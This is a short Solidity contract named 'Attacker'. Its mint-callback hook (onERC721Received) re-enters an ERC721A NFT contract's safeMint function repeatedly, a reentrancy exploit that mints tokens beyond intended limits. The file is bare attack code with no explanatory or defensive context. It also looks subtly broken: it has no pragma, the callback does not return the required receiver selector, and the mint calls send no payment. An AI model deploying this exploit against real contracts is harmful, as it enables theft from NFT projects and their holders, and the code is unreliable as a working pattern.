import "erc721a/contracts/IERC721A.sol";

contract Attacker {
    address payable public nftContract;
    uint256 public counter;

    constructor(address payable _nftContract) {
        nftContract = _nftContract;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (counter <= 15) {
            (bool success, ) = nftContract.call(
                abi.encodeWithSignature("safeMint(uint256)", 3)
            );
            if (!success) revert();
            counter++;
        }
    }

    function initiate(uint256 _amount) public payable {
        (bool success, ) = nftContract.call(
            abi.encodeWithSignature("safeMint(uint256)", _amount)
        );
        if (!success) revert();
        counter++;
    }
}

